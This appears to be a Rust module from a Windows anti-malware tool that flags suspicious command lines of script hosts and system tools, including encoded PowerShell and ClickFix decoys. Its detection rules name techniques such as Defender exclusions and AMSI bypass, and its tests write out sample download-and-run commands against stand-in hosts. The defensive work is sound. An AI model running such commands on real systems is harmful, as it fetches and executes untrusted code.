//! Command lines of script hosts and Windows' own tools, and the patterns
//! that make them suspicious.
//!
//! Most infostealers today arrive without a file: a fake CAPTCHA page has the
//! user paste a command into the Run box (ClickFix), or a shortcut starts
//! PowerShell, `mshta` or `rundll32` with the payload on the command line.
//! The program that runs is signed by Microsoft, so scanning its file finds
//! nothing; the command line is where the attack is. The rules here are shared
//! by the Stealer check (start-up entries, tasks, services) and real-time
//! protection (programs as they start, commands typed into the Run box).

use std::path::Path;

/// How sure a match is. `High` is the pattern itself (download and run,
/// switching off Defender); `Medium` is common in attacks but also in
/// legitimate admin tools (an encoded command, a hidden window).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Confidence {
    Medium,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Match {
    /// Stable rule id, e.g. `powershell.download-run`.
    pub rule: String,
    /// What it does, in plain words.
    pub reason: String,
    pub confidence: Confidence,
}

impl Match {
    pub fn new(rule: &str, reason: impl Into<String>, confidence: Confidence) -> Self {
        Self { rule: rule.to_string(), reason: reason.into(), confidence }
    }
}

/// Programs whose command lines are checked: script hosts, and Windows tools
/// that download or run code for an attacker.
const HOSTS: &[&str] = &[
    "powershell", "pwsh", "cmd", "conhost", "mshta", "rundll32", "regsvr32", "certutil", "bitsadmin", "wscript", "cscript",
];

/// The checked host a program is (`C:\…\PowerShell.exe` → `powershell`).
pub fn host(program: &str) -> Option<&'static str> {
    let program = program.trim().trim_matches('"');
    let stem = Path::new(program).file_stem()?.to_string_lossy().to_ascii_lowercase();
    HOSTS.iter().copied().find(|h| *h == stem)
}

/// The program and the rest of a command line, without looking at the disk:
/// `"C:\a b\x.exe" -y` → (`C:\a b\x.exe`, `-y`).
pub fn split_command(command: &str) -> (&str, &str) {
    let command = command.trim();
    if let Some(rest) = command.strip_prefix('"') {
        if let Some((program, args)) = rest.split_once('"') {
            return (program, args.trim());
        }
    }
    match command.split_once(' ') {
        Some((program, args)) => (program, args.trim()),
        None => (command, ""),
    }
}

/// Splits arguments on spaces, keeping quoted parts together.
pub fn tokens(args: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    for c in args.chars() {
        match c {
            '"' => quoted = !quoted,
            ' ' if !quoted => {
                if !current.is_empty() {
                    out.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

/// What makes `host` started with `args` suspicious; empty when nothing does.
/// Commands that `cmd` or `conhost` pass on to another host are checked as
/// that host too, and an `-EncodedCommand` is decoded and checked.
pub fn analyze(host: &str, args: &str) -> Vec<Match> {
    let mut out = Vec::new();
    collect(host, args, 0, &mut out);
    out
}

/// The script hidden in a PowerShell `-EncodedCommand` (also when `cmd` or
/// `conhost` starts PowerShell), decoded.
pub fn encoded_command(host: &str, args: &str) -> Option<String> {
    encoded_payload(host, args).and_then(|payload| decode_powershell(&payload))
}

/// The argument of `-EncodedCommand`, as given.
fn encoded_payload(host: &str, args: &str) -> Option<String> {
    let toks = tokens(args);
    let start = if is_powershell(host) {
        0
    } else {
        toks.iter().position(|t| self::host(t).is_some_and(is_powershell))? + 1
    };
    let mut rest = toks.into_iter().skip(start);
    while let Some(t) = rest.next() {
        match flag(&t) {
            Some(f) if is_encoded_flag(&f) => return rest.next(),
            // Everything after -Command or -File belongs to the script.
            Some(f) if matches!(f.as_str(), "c" | "command" | "f" | "file") => return None,
            _ => {}
        }
    }
    None
}

fn collect(host: &str, args: &str, depth: usize, out: &mut Vec<Match>) {
    let lower = args.to_ascii_lowercase();
    let mut add = |m: Match| {
        if !out.iter().any(|o| o.rule == m.rule) {
            out.push(m);
        }
    };
    if let Some(m) = decoy(&lower) {
        add(m);
    }
    match host {
        "powershell" | "pwsh" => {
            let toks = tokens(args);
            let decoded = encoded_command(host, args);
            if encoded_payload(host, args).is_some() || lower.contains("frombase64string") {
                add(Match::new("powershell.encoded", format!("{host} runs encoded (hidden) code"), Confidence::Medium));
            }
            let windowstyle = toks.iter().zip(toks.iter().skip(1)).any(|(t, value)| {
                flag(t).is_some_and(|f| f.starts_with('w') && "windowstyle".starts_with(&f))
                    && matches!(value.to_ascii_lowercase().as_str(), "hidden" | "1")
            });
            if windowstyle {
                add(Match::new("powershell.hidden", format!("{host} runs in a hidden window"), Confidence::Medium));
            }
            // The decoded script counts as much as the visible arguments.
            let text = match &decoded {
                Some(script) => format!("{lower}\n{}", script.to_ascii_lowercase()),
                None => lower.clone(),
            };
            for m in script_rules(host, &text) {
                add(m);
            }
        }
        "mshta" => {
            if has(&lower, &["http://", "https://", "javascript:", "vbscript:"]) {
                add(Match::new("mshta.remote", "mshta runs a script from the internet or from its own command line", Confidence::High));
            } else {
                add(Match::new("mshta.any", "mshta is a common way to run downloaded scripts", Confidence::Medium));
            }
        }
        "rundll32" => {
            if has(&lower, &["javascript:", "vbscript:", "mshtml,runhtmlapplication"]) {
                add(Match::new("rundll32.script", "rundll32 runs a script, a known way to hide one", Confidence::High));
            }
            if has(&lower, &["http://", "https://", "davwwwroot", "@ssl\\"]) {
                add(Match::new("rundll32.remote", "rundll32 loads a library from the internet", Confidence::High));
            }
        }
        "regsvr32" => {
            if has(&lower, &["/i:http", "-i:http", "scrobj"]) {
                add(Match::new("regsvr32.remote", "regsvr32 runs a script from the internet", Confidence::High));
            }
        }
        "certutil" => {
            if has(&lower, &["urlcache", "verifyctl"]) && has(&lower, &["http://", "https://"]) {
                add(Match::new("certutil.download", "certutil downloads a file, a common malware trick", Confidence::High));
            }
            if has(&lower, &["-decode", "/decode"]) {
                add(Match::new("certutil.decode", "certutil decodes a hidden file", Confidence::Medium));
            }
        }
        "bitsadmin" => {
            if has(&lower, &["/transfer", "/addfile"]) {
                add(Match::new("bitsadmin.download", "bitsadmin downloads a file in the background", Confidence::Medium));
            }
        }
        "cmd" => {
            let downloads = has(&lower, &["http://", "https://"])
                && (words(&lower, &["curl", "wget", "certutil", "bitsadmin", "iwr", "irm"]) || lower.contains("invoke-webrequest"));
            if downloads && has(&lower, &["&", "|", "start "]) {
                add(Match::new("cmd.download-run", "cmd downloads a file and runs it in one command", Confidence::High));
            }
        }
        _ => {}
    }
    // `cmd /c powershell …`, `conhost --headless powershell …`: check what
    // they start as well.
    if depth < 2 && matches!(host, "cmd" | "conhost") {
        let toks = tokens(args);
        if let Some(i) = toks.iter().position(|t| self::host(t).is_some()) {
            let inner = self::host(&toks[i]).unwrap_or_default();
            if inner != host || i > 0 {
                collect(inner, &toks[i + 1..].join(" "), depth + 1, out);
            }
        }
    }
}

/// Rules on PowerShell code: the visible arguments plus any decoded script.
fn script_rules(host: &str, text: &str) -> Vec<Match> {
    let mut out = Vec::new();
    let downloads = has(text, &["http://", "https://", "downloadstring", "downloadfile", "downloaddata", "net.webclient", "start-bitstransfer", "invoke-webrequest", "invoke-restmethod"])
        || words(text, &["iwr", "irm", "curl", "wget"]);
    let runs = words(text, &["iex"]) || has(text, &["invoke-expression", "scriptblock]::create", ".invoke(", "start-process", "invoke-item"]);
    // `[ScriptBlock]::Create` alone is how shells and editors load their own
    // integration scripts; it only counts next to a download.
    let runs_text = words(text, &["iex"]) || text.contains("invoke-expression");
    if downloads && runs {
        out.push(Match::new("powershell.download-run", format!("{host} downloads code from the internet and runs it"), Confidence::High));
    } else if downloads {
        out.push(Match::new("powershell.download", format!("{host} downloads from the internet"), Confidence::Medium));
    } else if runs_text {
        out.push(Match::new("powershell.iex", format!("{host} runs code built at run time (Invoke-Expression)"), Confidence::Medium));
    }
    if has(text, &["add-mppreference", "set-mppreference"])
        && has(text, &["exclusion", "disablerealtimemonitoring", "disableioavprotection", "disablebehaviormonitoring"])
    {
        out.push(Match::new("powershell.defender", format!("{host} changes Microsoft Defender (adds an exclusion or turns protection off)"), Confidence::High));
    }
    if has(text, &["amsiutils", "amsiinitfailed", "amsiscanbuffer"]) {
        out.push(Match::new("powershell.amsi-bypass", format!("{host} tries to switch off script scanning (AMSI)"), Confidence::High));
    }
    out
}

/// ClickFix ends the pasted command with a comment such as `# ✅ I am not a
/// robot - reCAPTCHA Verification ID: 4821`, so the Run box shows only that.
fn decoy(lower: &str) -> Option<Match> {
    const BAIT: &[&str] = &["captcha", "robot", "verif", "human", "cloudflare", "ray id"];
    let comment = [lower.find('#'), lower.find(" rem "), lower.find("::")].into_iter().flatten().min()?;
    let tail = &lower[comment..];
    has(tail, BAIT).then(|| {
        Match::new("clickfix.decoy", "the command hides behind a fake verification message (ClickFix)", Confidence::High)
    })
}

fn is_powershell(host: &str) -> bool {
    matches!(host, "powershell" | "pwsh")
}

/// `-Name` or `/Name` → `name`.
fn flag(token: &str) -> Option<String> {
    let name = token.strip_prefix('-').or_else(|| token.strip_prefix('/'))?;
    (!name.is_empty()).then(|| name.to_ascii_lowercase())
}

/// PowerShell takes any unambiguous prefix of `-EncodedCommand` (`-e`,
/// `-enc`…) and the alias `-ec`; `-ex` is `-ExecutionPolicy`.
fn is_encoded_flag(name: &str) -> bool {
    name == "ec" || "encodedcommand".starts_with(name)
}

fn has(text: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| text.contains(n))
}

/// Whether any of `words` appears on its own, not inside a longer name.
fn words(text: &str, words: &[&str]) -> bool {
    let bytes = text.as_bytes();
    let boundary = |i: usize| i >= bytes.len() || !(bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_' || bytes[i] == b'-');
    words.iter().any(|w| {
        text.match_indices(w).any(|(i, _)| (i == 0 || boundary(i - 1)) && boundary(i + w.len()))
    })
}

/// PowerShell's `-EncodedCommand` payload: base64 of UTF-16LE text.
fn decode_powershell(payload: &str) -> Option<String> {
    let payload = payload.trim();
    if payload.len() < 8 {
        return None;
    }
    let bytes = base64_decode(payload)?;
    let units: Vec<u16> = bytes.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
    let script = String::from_utf16_lossy(&units);
    (!script.trim().is_empty()).then_some(script)
}

/// Standard or URL-safe base64, padding optional.
fn base64_decode(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(text.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in text.bytes() {
        let value = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            _ => return None,
        };
        acc = (acc << 6 | value as u32) & 0xFFFF;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(host: &str, args: &str) -> Vec<String> {
        analyze(host, args).into_iter().map(|m| m.rule).collect()
    }

    fn encode(script: &str) -> String {
        crate::system::encode_powershell(script)
    }

    #[test]
    fn hosts_are_recognised_by_file_name() {
        assert_eq!(host(r"C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe"), Some("powershell"));
        assert_eq!(host(r#""C:\Windows\system32\mshta.exe""#), Some("mshta"));
        assert_eq!(host("notepad.exe"), None);
        assert_eq!(split_command(r#""C:\a b\x.exe" -y"#), (r"C:\a b\x.exe", "-y"));
        assert_eq!(split_command("powershell -w hidden"), ("powershell", "-w hidden"));
        assert_eq!(tokens(r#"-File "C:\a b\x.ps1" -y"#), ["-File", r"C:\a b\x.ps1", "-y"]);
    }

    #[test]
    fn encoded_commands_are_decoded_and_checked() {
        let payload = encode("iex (iwr 'https://example.test/a.ps1')");
        assert_eq!(encoded_command("powershell", &format!("-NoP -e {payload}")).as_deref(), Some("iex (iwr 'https://example.test/a.ps1')"));
        assert!(encoded_command("powershell", "-ex bypass -File x.ps1").is_none(), "-ex is -ExecutionPolicy");
        let found = rules("powershell", &format!("-w hidden -EncodedCommand {payload}"));
        assert_eq!(found, ["powershell.encoded", "powershell.hidden", "powershell.download-run"]);
        // Through cmd as well.
        assert_eq!(encoded_command("cmd", &format!("/c powershell -enc {payload}")).as_deref(), Some("iex (iwr 'https://example.test/a.ps1')"));
        assert!(rules("cmd", &format!("/c powershell -enc {payload}")).contains(&"powershell.download-run".to_string()));
    }

    #[test]
    fn clickfix_commands_are_high_confidence() {
        let pasted = r#"-w h -c "iex(irm https://x.test/v)" # ✅ I am not a robot - reCAPTCHA Verification ID: 4821"#;
        let found = analyze("powershell", pasted);
        assert!(found.iter().any(|m| m.rule == "clickfix.decoy" && m.confidence == Confidence::High), "{found:?}");
        assert!(found.iter().any(|m| m.rule == "powershell.download-run"), "{found:?}");
        assert!(rules("conhost", "--headless powershell -c iex(irm https://x.test/v)").contains(&"powershell.download-run".to_string()));
        assert_eq!(rules("mshta", "https://x.test/verify.hta"), ["mshta.remote"]);
        assert_eq!(rules("cmd", "/c curl -o %TEMP%\\a.exe https://x.test/a && %TEMP%\\a.exe"), ["cmd.download-run"]);
        assert_eq!(rules("powershell", "-c Add-MpPreference -ExclusionPath C:\\Users"), ["powershell.defender"]);
        assert_eq!(rules("regsvr32", "/s /n /u /i:http://x.test/a.sct scrobj.dll"), ["regsvr32.remote"]);
        assert_eq!(rules("rundll32", r#"javascript:"\..\mshtml,RunHTMLApplication ";alert(1)"#), ["rundll32.script"]);
        assert_eq!(rules("certutil", "-urlcache -split -f http://x.test/a.exe a.exe"), ["certutil.download"]);
    }

    #[test]
    fn ordinary_commands_are_left_alone() {
        for (host, args) in [
            ("powershell", r"-NoProfile -ExecutionPolicy Bypass -File C:\Tools\backup.ps1"),
            ("powershell", "-ex bypass -c Get-Process"),
            ("pwsh", "-wd C:\\src -c dotnet build"),
            ("cmd", "/c echo hi"),
            ("cmd", "/d /c npm run build && npm test"),
            ("rundll32", "shell32.dll,Control_RunDLL desk.cpl"),
            ("certutil", "-hashfile setup.exe SHA256"),
            ("conhost", "0xffffffff -ForceV1"),
            // A terminal loading its shell integration.
            ("powershell", r#"-NoProfile -NoExit -Command ". ([ScriptBlock]::Create([System.IO.File]::ReadAllText($env:HOOKS)))""#),
        ] {
            assert!(analyze(host, args).is_empty(), "{host} {args}: {:?}", analyze(host, args));
        }
        // A word inside a longer name is not the word.
        assert!(!words("get-iexplorer", &["iex"]));
        assert!(words("iex(irm x)", &["iex", "irm"]));
    }
}
